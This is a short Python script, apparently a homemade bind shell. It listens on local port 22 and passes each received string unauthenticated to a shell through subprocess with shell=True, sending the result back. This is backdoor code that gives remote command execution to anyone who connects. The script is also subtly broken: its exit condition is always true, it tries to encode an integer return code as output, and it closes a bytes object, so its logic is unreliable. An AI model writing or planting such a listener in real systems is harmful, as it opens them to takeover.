#!/bin/python3

import socket
import subprocess
import cmd

sockboi = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

with sockboi as s:
    s.bind(("127.0.0.1", 22))
    s.listen(2)
    me, addr = s.accept()
    com = me.recv(2048)
    while com != 'quit' or 'exit':
        com = str(com)
        out = subprocess.check_call(com, shell=True)
        me.send(out.encode())
        com = me.recv(2048)
    com.close()
s.close()

